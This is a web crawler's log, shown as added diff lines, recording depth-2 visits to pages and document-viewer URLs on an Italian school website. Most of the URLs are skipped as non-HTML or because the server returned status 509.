+2025-06-17 04:55:15,188 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=389 (Status: 200 or non-HTML).
+2025-06-17 04:55:15,188 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=387
+2025-06-17 04:55:15,470 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=387 (Status: 200 or non-HTML).
+2025-06-17 04:55:15,470 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=387
+2025-06-17 04:55:15,674 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=387 (Status: 200 or non-HTML).
+2025-06-17 04:55:15,675 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=385
+2025-06-17 04:55:15,962 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=385 (Status: 200 or non-HTML).
+2025-06-17 04:55:15,963 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=385
+2025-06-17 04:55:16,241 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=385 (Status: 200 or non-HTML).
+2025-06-17 04:55:16,242 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/regolamento-di-istituto#maincontent
+2025-06-17 04:55:16,514 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837
+2025-06-17 04:55:16,665 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837 (Status: 200 or non-HTML).
+2025-06-17 04:55:16,666 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837&inl=1
+2025-06-17 04:55:16,902 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:16,902 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638
+2025-06-17 04:55:17,151 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638 (Status: 200 or non-HTML).
+2025-06-17 04:55:17,151 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638&inl=1
+2025-06-17 04:55:17,355 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:17,356 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670
+2025-06-17 04:55:17,608 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670 (Status: 200 or non-HTML).
+2025-06-17 04:55:17,608 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670&inl=1
+2025-06-17 04:55:17,751 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:17,751 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131
+2025-06-17 04:55:17,821 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131 (Status: 509 or non-HTML).
+2025-06-17 04:55:17,821 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131&inl=1
+2025-06-17 04:55:17,890 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:17,890 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723
+2025-06-17 04:55:17,962 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723 (Status: 509 or non-HTML).
+2025-06-17 04:55:17,962 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723&inl=1
+2025-06-17 04:55:18,031 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,031 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326
+2025-06-17 04:55:18,100 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,100 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326&inl=1
+2025-06-17 04:55:18,269 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326&inl=1 (Status: 200 or non-HTML).
+2025-06-17 04:55:18,270 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3860
+2025-06-17 04:55:18,600 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3860 (Status: 200 or non-HTML).
+2025-06-17 04:55:18,600 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3860
+2025-06-17 04:55:18,667 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3860 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,667 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3859
+2025-06-17 04:55:18,735 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3859 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,737 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3859
+2025-06-17 04:55:18,805 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3859 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,805 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3835
+2025-06-17 04:55:18,871 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3835 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,871 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3835
+2025-06-17 04:55:18,936 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3835 (Status: 509 or non-HTML).
+2025-06-17 04:55:18,936 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3604
+2025-06-17 04:55:19,002 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3604 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,002 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3604
+2025-06-17 04:55:19,067 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3604 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,067 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3491
+2025-06-17 04:55:19,133 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3491 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,133 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3491
+2025-06-17 04:55:19,198 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3491 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,199 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3438
+2025-06-17 04:55:19,265 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3438 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,265 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3438
+2025-06-17 04:55:19,333 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3438 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,333 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3411
+2025-06-17 04:55:19,398 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3411 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,398 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3411
+2025-06-17 04:55:19,465 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3411 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,465 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3207
+2025-06-17 04:55:19,531 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3207 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,532 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3207
+2025-06-17 04:55:19,598 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3207 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,598 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3189
+2025-06-17 04:55:19,877 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3189 (Status: 200 or non-HTML).
+2025-06-17 04:55:19,878 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3189
+2025-06-17 04:55:19,944 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3189 (Status: 509 or non-HTML).
+2025-06-17 04:55:19,944 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3499
+2025-06-17 04:55:20,010 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3499 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,010 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3499
+2025-06-17 04:55:20,076 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3499 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,076 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2031
+2025-06-17 04:55:20,142 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2031 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,143 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2031
+2025-06-17 04:55:20,208 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2031 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,208 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1575
+2025-06-17 04:55:20,273 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1575 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,273 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1575
+2025-06-17 04:55:20,339 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1575 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,339 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=839
+2025-06-17 04:55:20,405 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=839 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,405 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=839
+2025-06-17 04:55:20,470 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=839 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,470 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=913
+2025-06-17 04:55:20,536 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=913 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,537 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=913
+2025-06-17 04:55:20,602 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=913 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,603 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=17
+2025-06-17 04:55:20,668 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=17 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,669 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=17
+2025-06-17 04:55:20,734 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=17 (Status: 509 or non-HTML).
+2025-06-17 04:55:20,734 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/accreditamento-regionale#maincontent
+2025-06-17 04:55:21,004 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3205
+2025-06-17 04:55:21,070 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3205 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,070 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3205
+2025-06-17 04:55:21,136 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3205 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,136 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/comitato-tecnico-scientifico#maincontent
+2025-06-17 04:55:21,202 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/comitato-tecnico-scientifico#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:21,202 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/partner-territoriali#maincontent
+2025-06-17 04:55:21,268 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/partner-territoriali#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:21,268 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/-privacy#maincontent
+2025-06-17 04:55:21,333 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/-privacy#maincontent (Status: 509 or non-HTML).
+2025-06-17 04:55:21,334 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725
+2025-06-17 04:55:21,399 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,399 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725&inl=1
+2025-06-17 04:55:21,464 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,465 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305
+2025-06-17 04:55:21,530 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,530 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305&inl=1
+2025-06-17 04:55:21,595 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,596 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304
+2025-06-17 04:55:21,662 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,662 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304&inl=1
+2025-06-17 04:55:21,728 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,728 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282
+2025-06-17 04:55:21,793 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,793 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282&inl=1
+2025-06-17 04:55:21,859 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,859 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601
+2025-06-17 04:55:21,925 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,925 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601&inl=1
+2025-06-17 04:55:21,990 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:21,991 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575
+2025-06-17 04:55:22,056 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,056 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575&inl=1
+2025-06-17 04:55:22,122 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575&inl=1 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,122 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3417
+2025-06-17 04:55:22,187 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3417 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,187 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3417
+2025-06-17 04:55:22,253 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3417 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,253 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3171
+2025-06-17 04:55:22,319 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3171 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,319 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3171
+2025-06-17 04:55:22,385 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3171 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,385 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3173
+2025-06-17 04:55:22,450 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3173 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,451 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3173
+2025-06-17 04:55:22,516 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3173 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,516 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2987
+2025-06-17 04:55:22,581 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2987 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,582 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2987
+2025-06-17 04:55:22,647 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2987 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,647 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1485
+2025-06-17 04:55:22,713 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1485 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,714 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1485
+2025-06-17 04:55:22,779 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1485 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,779 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1483
+2025-06-17 04:55:22,845 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1483 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,845 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1483
+2025-06-17 04:55:22,911 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1483 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,911 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1481
+2025-06-17 04:55:22,980 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1481 (Status: 509 or non-HTML).
+2025-06-17 04:55:22,980 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1481
+2025-06-17 04:55:23,046 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1481 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,046 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1479
+2025-06-17 04:55:23,111 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1479 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,112 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1479
+2025-06-17 04:55:23,181 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1479 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,181 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1477
+2025-06-17 04:55:23,247 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1477 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,247 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1477
+2025-06-17 04:55:23,313 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1477 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,313 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=925
+2025-06-17 04:55:23,386 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=925 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,386 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=925
+2025-06-17 04:55:23,456 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=925 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,457 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=295
+2025-06-17 04:55:23,522 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=295 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,522 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=295
+2025-06-17 04:55:23,587 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=295 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,588 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3175
+2025-06-17 04:55:23,656 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3175 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,656 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3175
+2025-06-17 04:55:23,722 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3175 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,722 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/progetti#maincontent
+2025-06-17 04:55:23,788 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/progetti#maincontent (Status: 509 or non-HTML).
